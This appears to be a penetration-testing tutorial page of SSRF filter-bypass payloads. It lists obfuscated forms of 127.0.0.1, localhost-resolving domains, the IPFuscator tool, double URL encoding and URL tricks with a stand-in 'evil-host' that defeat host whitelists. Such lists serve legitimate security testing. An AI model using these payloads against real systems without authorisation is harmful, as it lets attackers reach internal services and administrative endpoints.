# SSRF (I)

In this module we will show some payloads for testing a field that may be potentially vulnerable to SSRF. We will only use the HTTP/S protocol.

## Payloads (localhost)

* We can also **abbreviate IP addresses** by removing zeros:

```bash
0 # 127.0.0.1
127.1
127.0.1
0.0.0.0
0000
```

* Abusing **IPv6** to bypass filters:

```bash
[::]
[::]:80
0000::1
0000::1:80
```

* With **CIDR format** we can bypass filters, especially for whitelists that only allow 127.0.0.1:

```bash
127.127.127.127
127.0.1.3
127.0.0.0
```

* **IPv6/IPv4 address embedding** is useful when both IPv4 and IPv6 are blacklisted but misconfigured:

```bash
[0:0:0:0:0:ffff:127.0.0.1]
```

* With decimal IP location:

```bash
0177.0.0.1
0177.1
017700000001
0x7f.1
2130706433
```

* Take advantage of **domain redirection**, which is useful when all IP addresses are blacklisted:

```bash
localtest.me
127.0.0.1.nip.io
test.app.127.0.0.1.nip.io
test-app-127-0-0-1.nip.io
test.app.127.0.0.1.xip.io
```

* If the servers interpret the **attached alphanumeric characters** as normal, we can use them:

```
①②⑦.⓪.⓪.①
⓵⓶⓻.⓪.⓪.⓵
```

{% hint style="danger" %}
It should be noted that these are not all the combinations you can make with IP 127.0.0.1
{% endhint %}

## Payloads (IP)

In addition to the above possible combinations that we can make with a normal IP address, we should also consider using the following tool, [IPFuscator](https://github.com/vysecurity/IPFuscator):

```bash
git clone https://github.com/vysecurity/IPFuscator
cd IPFuscator
python2 ipfuscator.py <IP>
```

## Others bypass

* **Double URL encoding**: It is possible that the host part is not the problem, but the resource it is pointing to. Example:

```bash
http://127.0.0.1/admin # Not work
http://127.0.0.1/%2561dmin # Hide "admin" with double URL encode.
```

* Skip whitelist that allows only a certain host:

```bash
https://expected-host@evil-host/<PATH> # Number 1
https://evil-host#expected-host/<PATH> # Number 2
https://evil-host%25%32%33@expected-host/<PATH> # Number 3 (%25%32%33 = #)
```

* You can take advantage of the DNS name hierarchy to place the required entry in a fully qualified DNS name that you control:

```
https://expected-host -> https://expected-host.evil-host
http://holo.live -> http://holo.live.localtest.me/
```
